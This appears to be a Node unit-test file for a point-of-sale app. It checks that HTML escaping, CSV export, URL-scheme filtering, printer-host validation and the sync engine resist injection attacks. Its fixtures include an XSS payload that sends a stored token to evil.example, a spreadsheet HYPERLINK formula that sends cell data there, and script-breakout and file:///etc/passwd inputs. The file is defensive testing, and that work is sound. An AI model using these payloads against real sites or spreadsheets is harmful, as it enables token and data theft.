const { test } = require('node:test');
const assert = require('node:assert/strict');

// The browser app is written as ES modules; Node's `require(esm)` support
// lets the same helpers be unit tested from the server test-suite.
const { escapeHtml, escapeCsvCell, escapeUrlAttribute, sanitizeCustomCss } = require('../../apps/web/src/utils/sanitize.js');
const { buildReportHtml, buildSalesCsv, buildReportTableRows } = require('../../apps/web/src/utils/reports.js');

// The Electron main-process modules are plain CommonJS and can be unit
// tested without booting Electron.
const { isValidPrinterHost, isValidPrinterPort } = require('../../apps/desktop/printers.cjs');
const syncEngine = require('../../apps/desktop/sync-engine.cjs');

const XSS_PAYLOAD = '<img src=x onerror="fetch(\'https://evil.example/?\'+localStorage.getItem(\'token\'))">';
const FORMULA_PAYLOAD = '=HYPERLINK("https://evil.example?d="&A1,"click")';

// ---------------------------------------------------------------------------
// HTML escaping
// ---------------------------------------------------------------------------

test('escapeHtml neutralises tag and attribute breakouts', () => {
  const escaped = escapeHtml(XSS_PAYLOAD);
  assert.ok(!escaped.includes('<'), 'no raw < may survive');
  assert.ok(!escaped.includes('>'), 'no raw > may survive');
  assert.ok(escaped.includes('&lt;'), 'the payload must be entity encoded');
  assert.equal(escapeHtml('a & b'), 'a &amp; b');
  assert.equal(escapeHtml(null), '');
  assert.equal(escapeHtml(undefined), '');
});

test('escapeUrlAttribute only allows safe schemes', () => {
  assert.equal(escapeUrlAttribute('javascript:alert(1)'), '');
  assert.equal(escapeUrlAttribute('data:text/html,<script>alert(1)</script>'), '');
  assert.ok(escapeUrlAttribute('https://cdn.example.com/logo.png').startsWith('https://'));
  assert.ok(escapeUrlAttribute('data:image/png;base64,AAAA').startsWith('data:image/png'));
  assert.equal(escapeUrlAttribute(''), '');
});

test('sanitizeCustomCss cannot break out of the style block', () => {
  const css = '</style><script>alert(1)</script><style>';
  const safe = sanitizeCustomCss(css);
  assert.ok(!safe.includes('<'), 'no raw < may survive');
  assert.ok(!safe.includes('>'), 'no raw > may survive');
  assert.ok(!safe.toLowerCase().includes('script'));
  assert.equal(sanitizeCustomCss('body { color: #000; }'), 'body { color: #000; }');
});

// ---------------------------------------------------------------------------
// Printable report (stored XSS through user supplied sale data)
// ---------------------------------------------------------------------------

test('the printable report escapes a hostile cashier name', () => {
  const sales = [
    {
      _id: 'sale-1',
      transactionId: 'TXN-1',
      createdAt: new Date('2026-01-15T10:00:00Z').toISOString(),
      cashier: { roleTakerName: XSS_PAYLOAD },
      branchNumber: '101',
      paymentMethod: 'CASH',
      totalAmount: 10,
      totalWithTax: 10,
      items: [{ sku: 'A' }],
    },
  ];

  const html = buildReportHtml({
    sales,
    scope: 'global',
    periodLabel: 'January 2026',
    formatCurrency: (value) => `$${Number(value).toFixed(2)}`,
  });

  assert.ok(!html.includes('<img src=x'), 'the injected tag must not survive');
  assert.ok(!html.includes(XSS_PAYLOAD), 'the raw payload must not survive');
  assert.ok(!html.includes('"onerror'), 'no executable attribute may survive');
  assert.ok(html.includes('&lt;img'), 'the payload must be entity encoded');
  // The report document must also carry a strict CSP.
  assert.ok(html.includes('Content-Security-Policy'));
  assert.ok(html.includes('default-src'));
  assert.ok(!html.includes('onclick='), 'no inline event handler may be used');
});

test('the report table rows escape every interpolated field', () => {
  const rows = buildReportTableRows(
    [
      {
        transactionId: XSS_PAYLOAD,
        createdAt: new Date().toISOString(),
        cashier: { roleTakerName: XSS_PAYLOAD },
        branchNumber: XSS_PAYLOAD,
        paymentMethod: 'CASH',
        totalAmount: 5,
      },
    ],
    (value) => String(value)
  );
  assert.ok(!rows.includes('<img'));
  assert.ok(!rows.includes(XSS_PAYLOAD));
  assert.ok(!rows.includes('"onerror'));
});

// ---------------------------------------------------------------------------
// CSV export (formula injection)
// ---------------------------------------------------------------------------

test('csv cells neutralise formula injection', () => {
  const csv = escapeCsvCell(FORMULA_PAYLOAD);
  assert.ok(csv.startsWith('"\'='), 'a leading = must be neutralised with a quote');
  assert.ok(!csv.startsWith('"='), 'the cell must not start with a raw =');
});

test('csv export neutralises a hostile cashier name', () => {
  const csv = buildSalesCsv(
    [
      {
        transactionId: 'TXN-1',
        createdAt: new Date().toISOString(),
        cashier: { roleTakerName: FORMULA_PAYLOAD },
        branchNumber: '101',
        storeAddress: 'Main',
        paymentMethod: 'CASH',
        paymentStatus: 'Completed',
        items: [{ sku: 'A' }],
        totalAmount: 12,
      },
    ],
    'January 2026'
  );
  assert.ok(!csv.includes('"=HYPERLINK'), 'no raw formula may be written');
  assert.ok(csv.includes("\"'=HYPERLINK"), 'the formula must be prefixed with a quote');
});

test('csv export doubles embedded quotes', () => {
  const csv = buildSalesCsv(
    [
      {
        transactionId: 'TXN"1',
        createdAt: new Date().toISOString(),
        cashier: { roleTakerName: 'A"B' },
        branchNumber: '101',
        items: [],
        totalAmount: 1,
      },
    ],
    'January 2026'
  );
  assert.ok(csv.includes('"TXN""1"'));
  assert.ok(csv.includes('"A""B"'));
});

test('csv export handles the empty case', () => {
  const csv = buildSalesCsv([], 'January 2026');
  assert.ok(csv.startsWith('STATUS,MESSAGE'));
  assert.ok(csv.includes('NO_DATA'));
});

// ---------------------------------------------------------------------------
// Desktop: network printer target validation
// ---------------------------------------------------------------------------

test('network printer host must be a hostname or IP', () => {
  assert.equal(isValidPrinterHost('192.168.1.50'), true);
  assert.equal(isValidPrinterHost('printer.local'), true);
  assert.equal(isValidPrinterHost('my-printer'), true);

  assert.equal(isValidPrinterHost(''), false);
  assert.equal(isValidPrinterHost('http://192.168.1.50'), false);
  assert.equal(isValidPrinterHost('192.168.1.50:9100'), false);
  assert.equal(isValidPrinterHost('user@printer'), false);
  assert.equal(isValidPrinterHost('printer/../etc'), false);
  assert.equal(isValidPrinterHost('a'.repeat(300)), false);
  assert.equal(isValidPrinterHost(null), false);
});

test('network printer port must be a valid TCP port', () => {
  assert.equal(isValidPrinterPort(9100), true);
  assert.equal(isValidPrinterPort('9100'), true);
  assert.equal(isValidPrinterPort(0), false);
  assert.equal(isValidPrinterPort(70000), false);
  assert.equal(isValidPrinterPort('abc'), false);
});

// ---------------------------------------------------------------------------
// Desktop: sync engine must not leak the token to a foreign scheme
// ---------------------------------------------------------------------------

test('sync engine refuses to push queued sales to a non-http target', async () => {
  let called = false;
  const result = await syncEngine.syncQueuedSales({
    getApiBase: () => 'file:///etc/passwd',
    getQueuedSales: () => {
      called = true;
      return [{ key: 1, payload: { items: [] } }];
    },
    removeQueuedSale: () => {},
  });

  assert.equal(called, false, 'no queued sale may be read for an invalid endpoint');
  assert.equal(result.sent, 0);
  assert.ok(result.error);
});

test('sync engine reports an invalid endpoint instead of throwing', async () => {
  const result = await syncEngine.syncQueuedSales({
    getApiBase: () => 'not a url',
    getQueuedSales: () => [],
    removeQueuedSale: () => {},
  });
  assert.equal(result.sent, 0);
  assert.ok(result.error);
});
